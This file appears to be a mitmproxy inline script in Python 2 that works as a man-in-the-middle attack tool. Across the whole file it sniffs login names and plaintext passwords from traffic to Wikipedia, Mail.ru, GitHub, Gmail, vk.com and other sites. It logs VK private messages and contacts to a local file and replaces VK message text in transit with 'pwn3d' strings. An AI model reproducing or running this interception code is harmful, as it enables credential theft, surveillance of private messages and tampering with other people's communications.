import logging
import time
import cStringIO
from PIL import Image
from libmproxy.protocol.http import decoded
import re
import urllib # Russian messages support
from sets import Set

logging.basicConfig(filename="/root/mitm.log",level=logging.DEBUG)

class VK_user:
    def __init__(self):
        self.id = ""
        self.peers = {}
        self.messages = []

    def __repr__(self):
        s = "\n"
        s += "User vk id = " + str(self.id) + "\n"
        for peer in self.peers.keys():
            s += "\tpeer " + peer + ": "
            for hs in list(self.peers[peer]):
                s += hs + "  |  "
            s += "\n"
        s += "\n"
        s += "| toUser".ljust(20)+"| Topic".ljust(20)+"| Message".ljust(20)+'\n'
        for m in self.messages:
            s += str(m[1]).ljust(20) + str(m[2]).ljust(20) + str(m[0]).ljust(20) + "\n"
        s += "\n"
        return s

class VK_data:
    def __init__(self):
        self.users = {}
        self.current_user = ""
        # temp user to store data if we do not currently know the id
        self.on_new_id("temp")
        
    def from_a_typing(self, string):
        m = re.match(r"act=a_typing&al=(?P<al>\d+)&gid=(?P<gid>\d+)&hash=(?P<hash>\w+)&peer=(?P<peer>\d+)", string)
        if not m:
            logging.debug("from_a_typing: Failed to parse " + string)
            return [0]

        logging.debug("Typing: al = " + m.group('al') + " gid = " + m.group('gid') + 
                      " hash = " + m.group('hash') + " peer = " + m.group('peer'))
        
        if m.group('peer') not in self.users[self.current_user].peers.keys():
            self.users[self.current_user].peers[m.group('peer')] = Set([])
        self.users[self.current_user].peers[m.group('peer')].add(m.group('hash'))
 
        return [1]

        
    def from_a_send(self, string):
        m = re.match((r"act=a_send&al=(?P<al>\d+)&gid=(?P<gid>\d+)&guid" +
              "=(?P<guid>\d+\.?\d*)&hash=(?P<hash>\w+)&media=(?P" +
              "<media>\w*)&msg=(?P<msg>[\w\W]*)&title=(?P<title>\w*)" +
              "&to=(?P<to>\d+)&ts=(?P<ts>\d+)"), string, re.UNICODE)
        if not m:
            logging.debug(string)
            return [0, string]

        logging.debug("al = " + m.group('al'))
        logging.debug("gid = " + m.group('gid'))
        logging.debug("guid = " + m.group('guid'))
        logging.debug("hash = " + m.group('hash'))
        logging.debug("media = " + m.group('media'))
        logging.debug("msg = " + m.group('msg'))
        logging.debug("title = " + m.group('title'))
        logging.debug("to = " + m.group('to'))
        logging.debug("ts = " + m.group('ts'))

        if m.group('to') not in self.users[self.current_user].peers.keys():
            self.users[self.current_user].peers[m.group('to')] = Set([])
        self.users[self.current_user].peers[m.group('to')].add(m.group('hash'))

        self.users[self.current_user].messages.append([m.group('msg'), m.group('to'), m.group('hash')])

        logging.debug(str(self.users[self.current_user]))

        # Substitute message
        string_ = ("act=a_send&al="+m.group('al')+"&gid="+m.group('gid')+"&guid="+
                  m.group('guid')+"&hash="+m.group('hash')+"&media="+m.group('media')+
                  "&msg="+"I have been pwn3d"+"&title="+m.group('title')+
                  "&to="+m.group('to')+"&ts="+m.group('ts'))

        return [2, string_]

    def from_a_check(self, string):
        m_key = re.match(r"act=a_check&key=[\w\W]*", string, re.UNICODE)
        m_id  = re.match(r"act=a_check&id=(?P<id>\d+)&[\w\W]*", string, re.UNICODE)

        if m_key:
            return [1]

        if m_id:
            logging.debug("[a_check]: Found my id: " + m_id.group('id'))
            self.on_new_id(m_id.group('id'))
            return [1]
        
        logging.debug(string)
        return [0]

    def decode_request(self, string):
        try:
            string = urllib.unquote(string).decode('utf-8')
        except:
            pass
        m = re.match(r"act=(?P<type>\w+)&\w+", string)
        if not m:
            return [0]
        
        if m.group('type') == "a_typing":
            return self.from_a_typing(string)

        if m.group('type') == "a_send":
            return self.from_a_send(string)

        if m.group('type') == "a_check":
            return self.from_a_check(string)
        
        # No-info types
        if m.group('type') == "login":
            return [1]
        
        if m.group('type') == "pad":
            return [1]
        
        if m.group('type') == "a_friends":
            return [1]
        
        if m.group('type') == "a_onlines":
            return [1]

        if m.group('type') == "a_release":
            return [1]

        if m.group('type') == "a_get_fast_chat":
            return [1]

        logging.debug("Unable to decode type " + m.group('type') 
                      + "! " + string)
        return [0]

    def decode_response(self, string):
        m = re.match(r"\{\"ts\":(?P<num>\d+),\"updates\":(?P<lstring>[\w\W]+),\"(?P<msg>[\w\W]+)\",\{\}(?P<rstring>[\w\W]*)\}", string)
        
        if not m:
            return [0]

        self.users[self.current_user].messages.append([m.group('msg'), str(self.users[self.current_user].id), "-"])
        logging.debug(str(self.users[self.current_user]))

        string_ = "{\"ts\":"+m.group('num')+",\"updates\":"+m.group('lstring')+",\""+"you have been pwn3d"+"\",{}"+m.group('rstring')+"}"
        return [2, string_]

    def on_new_id(self, my_id):
        if my_id not in self.users.keys():
            self.users[my_id] = VK_user()
            self.users[my_id].id = my_id

        if (self.current_user == "temp") and (my_id != "temp"):
            self.users[my_id] = self.users["temp"]
            self.users[my_id].id = my_id
            self.users["temp"] = VK_user()

        self.current_user = my_id

        logging.debug("Known my_ids: " + str(self.users.keys())) 
        logging.debug("Current my_id: " + str(self.current_user)) 
     
class PW_data:
    def __init__(self):
        self.passwords = []

    def sniff_passwords(self, string):
        if ("assword" not in string) and ("asswd" not in string) and ("pass" not in string):
            return

        try:
            string = urllib.unquote(string).decode('utf-8')
        except:
            pass

        # Wiki 
        m = re.match(r"wpName=(?P<login>[^&]*)&wpPassword=(?P<password>[^&]*)&[\w\W]*", string)
        if (m):
            self.passwords.append(["wikipedia.org", m.group('login'), m.group('password')])
            logging.debug(str(self))
            return

        # Mail.ru
        m = re.match(r"Login=(?P<login>[^&]*)&Domain=(?P<domain>[^&]*)&Password=(?P<password>[^&]*)&[\w\W]*", string)
        if (m):
            self.passwords.append(["mail.ru", m.group('login')+'@'+m.group('domain'), m.group('password')])
            logging.debug(str(self))
            return
       
        # Github
        m = re.match(r"[\w\W]*&login=(?P<login>[^&]*)&password=(?P<password>[^&]*)[\w\W]*", string)
        if (m):
            self.passwords.append(["github.com", m.group('login'), m.group('password')])
            logging.debug(str(self))
            return

        # Gmail
        m = re.match(r"[\w\W]*&Email=(?P<login>[^&]*)&Passwd=(?P<password>[^&]*)&[\w\W]*", string)
        if (m):
            self.passwords.append(["gmail.com", m.group('login'), m.group('password')])
            logging.debug(str(self))
            return

        # vk.com
        m = re.match(r"act=login&[\w\W]*&email=(?P<login>[^&]*)&pass=(?P<password>[^&]*)", string)
        if (m):
            self.passwords.append(["vk.com", m.group('login'), m.group('password')])
            logging.debug(str(self))
            return

        # Other websites
        self.passwords.append([string])
        logging.debug(str(self))

    def __repr__(self):
        s = '\n'
        s += "website".ljust(30) + "login".ljust(30) + "password".ljust(20) + '\n'
        for entry in self.passwords:
            if (len(entry) == 3):
                s += entry[0].ljust(30)+entry[1].ljust(30)+entry[2].ljust(20) + '\n'
            else:
                s += entry[0] + '\n'
        s += '\n'
        return s
        

vk_db = VK_data()
pw_db = PW_data()


def request(context, flow):
    try:
        with decoded(flow.request):  # automatically decode gzipped responses.
            pw_db.sniff_passwords(str(flow.request.content))
            result = vk_db.decode_request(str(flow.request.content))
            if (result[0] == 2):
                flow.request.content = result[1]

    except Exception as e:
        logging.debug(e)

def response(context, flow):
    try:
        with decoded(flow.response): # automatically decode gzipped responses.
            result = vk_db.decode_response(str(flow.response.content))
            if (result[0] == 2):
                flow.response.content = result[1]
                                                    
    except Exception as e:
        logging.debug(e)

def start (context, argv):
    logging.debug("============================================\n")
    logging.debug(time.time())
    logging.debug("Startup:\n")
    context.log("start")

